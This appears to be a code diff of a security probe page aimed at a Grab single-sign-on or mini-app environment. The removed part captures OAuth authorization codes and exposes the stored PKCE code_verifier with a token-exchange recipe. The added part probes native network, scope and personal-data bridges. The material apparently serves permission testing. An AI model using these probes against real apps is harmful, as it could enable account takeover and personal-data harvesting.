-    log("Native threw: "+e.message+" — falling back to web");
-    await doWebAuthorize()
+  for(var ep of endpoints){
+    var p=makeProbe("net-"+ep.label.replace(/\s/g,""),ep.label);
+    try{
+      var r=await invoke("NetworkModule","send",{endpoint:ep.url,method:"GET"});
+      var body=r.result;
+      if(typeof body==="string"){try{body=JSON.parse(body)}catch(e){}}
+      p.status(r.status_code>=200&&r.status_code<300?"ok":"deny",r.status_code);
+      p.data({status_code:r.status_code,result:body,error:r.error});
+      log(ep.label+" → "+r.status_code)
+    }catch(e){p.status("err","ERR");p.data(e.message);log(ep.label+" → "+e.message)}
   }
 }
 
 // ════════════════════════════════════════════════════════════════
-// Callback handler — if we land on this page with ?code= or #code=
-// Evidence: GrabSSO.vue in GrabSSO-DGDhimmK.js
-//   checks c.query.state, parses base64 state, sessionStorage "grab_oauth_hash"
-// Also: IdentityModule stores redirect_uri and login_return_uri in localStorage
+// PROBE ALL
 // ════════════════════════════════════════════════════════════════
-(function checkCallback(){
-  var params=new URLSearchParams(window.location.search);
-  var code=params.get("code");
-  var state=params.get("state");
-  var error=params.get("error");
-
-  // Also check hash fragment (some flows use #code=)
-  if(!code&&window.location.hash){
-    var hp=new URLSearchParams(window.location.hash.replace(/^#\/?/,"").split("?")[0]);
-    code=hp.get("code");state=hp.get("state")
-  }
-
-  var banner=document.getElementById("callback-banner");
-
-  if(code){
-    banner.className="result-banner success";
-    banner.innerHTML="<b>AUTH CODE RECEIVED</b><br>"
-      +"code = "+code.substring(0,40)+(code.length>40?"...":"")+"<br>"
-      +"state = "+(state||"(none)")+"<br>"
-      +"<span style='font-size:10px;opacity:.8'>Verify: compare state with localStorage grabid:state.<br>"
-      +"Exchange: POST to token_endpoint with code + code_verifier from localStorage grabid:code_verifier.</span>";
-
-    log("CALLBACK: code="+code);
-    log("CALLBACK: state="+state);
-
-    // Retrieve stored PKCE for display
-    var storedState=localStorage.getItem(LS_PREFIX+":state");
-    var storedVerifier=localStorage.getItem(LS_PREFIX+":code_verifier");
-    var storedRedirect=localStorage.getItem(LS_PREFIX+":redirect_uri");
-
-    setResult("ok","CODE RECEIVED",{
-      code:code,
-      state:state,
-      stateMatch:state===storedState,
-      storedCodeVerifier:storedVerifier,
-      storedRedirectUri:storedRedirect,
-      exchangeNote:"POST "+OIDC.production.replace(".well-known/openid-configuration","token")
-        +" with grant_type=authorization_code&code="+code+"&code_verifier="+storedVerifier
-        +"&redirect_uri="+storedRedirect+"&client_id=..."
-    });
-
-    // Show the verifier so we know we can exchange
-    if(storedState&&state===storedState){
-      log("STATE MATCH CONFIRMED");
-      log("code_verifier = "+storedVerifier)
-    }else{
-      log("STATE MISMATCH: got "+state+" stored "+storedState)
-    }
-  }else if(error){
-    banner.className="result-banner failure";
-    banner.innerHTML="<b>AUTH ERROR</b><br>"
-      +"error = "+error+"<br>"
-      +"description = "+(params.get("error_description")||"(none)");
-    log("CALLBACK ERROR: "+error+" — "+params.get("error_description"))
-  }
-})();
+async function probeAll(){
+  clearProbes();
+  detect();
+  log("═══ Scope Probes ═══");
+  await probeScopes();
+  log("═══ PII Probes ═══");
+  await probePII();
+  log("═══ Network Probes ═══");
+  await probeNetwork();
+  log("═══ DONE ═══")
+}
 </script>
 </body>
 </html>
